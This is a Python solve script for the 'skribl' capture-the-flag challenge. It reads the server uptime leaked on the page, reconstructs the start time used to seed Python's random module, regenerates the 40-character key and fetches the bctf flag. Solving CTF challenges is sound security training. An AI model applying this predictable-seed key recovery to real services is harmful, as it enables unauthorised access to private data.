import requests
import re
import math
import time
import random
import string

url = "http://skribl.chall.pwnoh.io"

index = requests.request('GET', url)

content = index.content.decode()

time_since_start = re.search(r"moment\.duration\(([0-9]+),", content).group(1)
time_since_start = int(time_since_start)

current_time = math.floor(time.time())

start_time = current_time - time_since_start

print(f"Time up: {time_since_start}")

print(f"Start time: {start_time}")

random.seed(start_time)

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits
key_list = [random.choice(alphabet) for i in range(40)]

key = ''.join(key_list)

print(f"Found key: {key}")

print("Getting flag...")

flag_page = requests.request("GET",f"{url}/view/{key}")
content = flag_page.content.decode()

flag = re.search(r"bctf\{\S+\}", content).group(0)

print(f"Found flag {flag} !")
